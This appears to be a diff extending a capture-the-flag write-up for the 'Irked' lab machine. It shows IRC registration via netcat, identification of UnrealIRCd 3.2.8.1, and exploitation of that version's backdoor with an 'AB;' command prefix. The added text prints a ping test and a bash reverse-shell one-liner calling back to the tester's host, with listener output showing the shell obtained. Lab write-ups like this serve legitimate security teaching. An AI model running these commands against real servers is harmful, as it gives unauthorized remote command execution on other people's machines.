@@ -91,15 +91,20 @@ ERROR :Closing Link: [10.10.14.16] (Ping timeout)
 ```
 
 
-After learning some IRC commands, we repeat this:
-
+After learning some IRC commands, we repeat this. This time I entered some pass, nick, and user commands.
+```
+PASS test123
+NICK test123
+USER test123 testing testing :test123
+```
+The output was:
 ```
 $nc 10.10.10.117 8067
 :irked.htb NOTICE AUTH :*** Looking up your hostname...
-**PASS test123**
-**NICK test123**
+PASS test123
+NICK test123
 :irked.htb NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead
-**USER test123 testing testing :test123**
+USER test123 testing testing :test123
 :irked.htb 001 test123 :Welcome to the ROXnet IRC Network test123!test123@10.10.14.16
 :irked.htb 002 test123 :Your host is irked.htb, running version Unreal3.2.8.1
 :irked.htb 003 test123 :This server was created Mon May 14 2018 at 13:12:50 EDT
@@ -113,6 +118,48 @@ $nc 10.10.10.117 8067
 :irked.htb 266 test123 :Current Global Users: 1  Max: 1
 :irked.htb 422 test123 :MOTD File is missing
 :test123 MODE test123 :+iwx
+```
+
+We got the banner from the server, with version number - running version Unreal3.2.8.1.
+
+It has a backdoor command execution vuln that can be used here. Metasploit module is available too.
+
+https://lwn.net/Articles/392201/ has details on the vulnerability. If a command starts with "AB", it gets passed to system().
+
+To test this - start tcpdump filtering for icmp.
+In another window, send this to irked.htb.
+
+```
+echo "AB; ping -c 3 10.10.14.16" | nc 10.10.10.117 8067
+```
+Once the connection times out, we see the pings.
+
+```
+$sudo tcpdump -i tun0 icmp
+tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
+listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
+17:54:20.465603 IP 10.10.10.117 > 10.10.14.16: ICMP echo request, id 1465, seq 1, length 64
+17:54:20.465714 IP 10.10.14.16 > 10.10.10.117: ICMP echo reply, id 1465, seq 1, length 64
+```
+Now we try a shell.
+
+Running a nc listener on port 4444, we run this command:
+
+```
+$echo "AB; bash -c 'bash -i >& /dev/tcp/10.10.14.16/4444 0>&1'" | nc 10.10.10.117 8067
+:irked.htb NOTICE AUTH :*** Looking up your hostname...
+:irked.htb NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead
+
+```
+In our nc listener, we get a shell.
+
+```
+$nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.10.14.16] from (UNKNOWN) [10.10.10.117] 36190
+bash: cannot set terminal process group (640): Inappropriate ioctl for device
+bash: no job control in this shell
+ircd@irked:~/Unreal3.2$
 ```
 
 
